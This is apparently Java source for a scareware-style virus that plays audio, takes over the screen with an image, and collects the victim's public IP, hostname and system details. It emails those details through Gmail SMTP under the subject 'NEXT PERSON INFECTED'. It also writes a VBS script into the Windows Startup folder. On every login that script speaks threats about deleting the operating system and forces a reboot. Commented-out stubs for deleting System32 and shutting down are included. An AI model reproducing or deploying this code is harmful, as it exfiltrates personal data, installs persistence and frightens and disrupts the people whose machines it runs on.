
import java.awt.Color;
import java.awt.DisplayMode;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.RenderingHints;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;
import java.util.Properties;
import javax.imageio.ImageIO;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JFrame;


import javazoom.jl.decoder.JavaLayerException;
import javazoom.jl.player.Player;

public class MainRunner extends JFrame {

	// IMPORTANT VARIABLES
	private static boolean infinite_loop = true;
	private BufferedImage image;
	private static Player music_player;
	private static File file_vbs;
	private static String ip;
	private static String local_address;
	private static String local_computer;
	private static String system_info;
	private static String system_info_two;
	private static String system_info_next;
	private static String desktop_env;
	private static int proc;

	public static void main(String[] args) throws JavaLayerException, InterruptedException, IOException {

		CheckAlive.CheckIfIsAlive();

		DisplayMode dm = new DisplayMode(1920, 1200, 16, DisplayMode.REFRESH_RATE_UNKNOWN);
		MainRunner run_fullscreen = new MainRunner();

		Music(MainRunner.class.getResourceAsStream("idiot.mp3"));
		Thread.sleep(20000);
		Music(MainRunner.class.getResourceAsStream("idiot.mp3"));
		run_fullscreen.fullScreen(dm);
		computer_info();
		send_info();
		Music(MainRunner.class.getResourceAsStream("idiot.mp3"));
		run_fullscreen.fullScreen(dm);
		vbs_file();
		boolean as = true;
		while(as){
			for(int i = 0; i < 10; i++){
				Music(MainRunner.class.getResourceAsStream("idiot.mp3"));
			}
			as = false;
		}
		run_fullscreen.fullScreen(dm);
		Thread.sleep(10000);
		//shutdown();
		vbs_file();

	}

	private static void Music(InputStream input_stream) throws JavaLayerException {

		BufferedInputStream bstream = new BufferedInputStream(input_stream);

		music_player = new Player(bstream);

		new Thread(() -> {
			try {
				music_player.play();
			} catch (Exception e) {
				e.printStackTrace();
			}

		}).start();

	}

	private void fullScreen(DisplayMode dm) {
		getContentPane().setBackground(Color.BLACK);

		ScreenMode screen = new ScreenMode();

		try {
			screen.setFullScreen(dm, this);
			load("idiot.jpg");
			Thread.sleep(10000);

		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
			screen.restoreScreen();
		}

	}

	private void load(String image_file) throws IOException {
		image = ImageIO.read(MainRunner.class.getResource(image_file));
		repaint();
	}

	public void paint(Graphics g) {

		if (g instanceof Graphics2D) {
			Graphics2D g2 = (Graphics2D) g;
			g2.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON);

			g2.drawImage(image, 0, 0, null);

		}
	}

	// THAT ONE IS STILL IN WORK
	/*public static void poppingBoxes() throws IOException {
		try {
			Runtime.getRuntime().exec(" wscript sourcefiles/hack.vbs ");
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
      */
	private static void send_info() {

		Properties props = new Properties();
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.socketFactory.port", "465");
		props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.port", "465");

		Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication("email", "password");
			}
		});

		try {

			Message message = new MimeMessage(session);
			message.setFrom(new InternetAddress("your_email_address"));
			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("recipient_email"));
			message.setSubject("NEXT PERSON INFECTED");
			message.setText("Your virus attached another person!! \n" + "Public IP: " + ip + "\nLocal IP and HOST: "
					+ local_computer + "\nSystem info: " + system_info + "\nSystem version: " + system_info_two
					+ "\n Architecture: " + system_info_next + "\n Desktop: " + desktop_env + "\n Processor: " + proc);

			Transport.send(message);

		} catch (MessagingException e) {
			throw new RuntimeException(e);
		}

	}

	private static void computer_info() throws IOException {
		URL whatismyip = new URL("http://checkip.amazonaws.com");
		BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));

		ip = in.readLine(); // you get the IP as a String

		try {
			local_computer = InetAddress.getLocalHost().toString();

		} catch (Exception ex) {
			ex.printStackTrace();
		}

		proc = Runtime.getRuntime().availableProcessors();

		system_info = System.getProperty("os.name");
		system_info_two = System.getProperty("os.version");
		system_info_next = System.getProperty("os.arch");
		desktop_env = System.getProperty("java.io.tmpdir");

	}

	 private static void vbs_file() throws IOException {

		String path = System.getProperty("user.home");
		System.out.println(path);
		File file_batch = new File(path+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autostart.vbs");
		FileWriter writer = new FileWriter(file_batch);
		writer.write("Dim message, sapi, objShell, message_two\n");
		writer.write("message = \"YOU HAVE BEEN HACKED TURN OFF YOUR COMPUTER OR WILL BE DESTROYED, PLEASE TURN OFF, WE WONT HARM YOU\"\n");
		writer.write("Set sapi = CreateObject(\"sapi.spvoice\")\n");
		writer.write("sapi.Speak message\n");
		writer.write("message_two = \"NOW WE WILL CONTINUE DELETING YOUR OPERATING SYSTEM\"\n");
		writer.write("sapi.Speak message_two\n");
		writer.write("x=msgbox(\"Do not touch the keyboard\")\n");
		writer.write("x=msgbox(\"Deleting Operating System...\")\n");
		writer.write("x=msgbox(\"KASZTAN\")\n");
		writer.write("Set objShell = WScript.createObject(\"WScript.shell\")\n");
		writer.write("objShell.Run \"shutdown.exe -r -t 20\"");


		writer.close();

	}

//	/*Deleting System32*/
//	public void deleteSystem() {
//	}

//	public static void shutdown() throws IOException {
//		Runtime runtime = Runtime.getRuntime();
//		Process proc = runtime.exec("shutdown -s -t 20");
//		System.exit(0);
//
//
//	}

}